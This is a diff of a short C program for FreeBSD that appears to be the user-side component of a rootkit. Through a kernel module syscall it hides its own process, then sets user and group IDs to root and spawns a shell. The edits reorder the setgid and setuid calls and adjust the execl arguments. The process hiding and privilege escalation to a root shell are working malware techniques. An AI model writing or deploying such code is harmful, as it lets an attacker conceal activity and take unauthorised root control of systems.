@@ -7,7 +7,8 @@
 #include <unistd.h>
 #include <sys/module.h>
 #include <sys/types.h>
-#include <sys/sysproto.h>
+// #include <sys/sysproto.h>
+
 
 int
 main(int argc, char *argv[]){
@@ -22,11 +23,11 @@ main(int argc, char *argv[]){
   syscall(syscall_num, getpid()); //hide self
 
   //elevation
-  setuid(0);
   setgid(0);
+  setuid(0);
 
   //spawn shell
   //https://www.freebsd.org/cgi/man.cgi?query=exec&sektion=3&manpath=freebsd-release-ports
-  execl("/bin/s", "sh", NULL);
+  execl("/bin/s", "sh", 0);
   printf("shell spawned");
 }
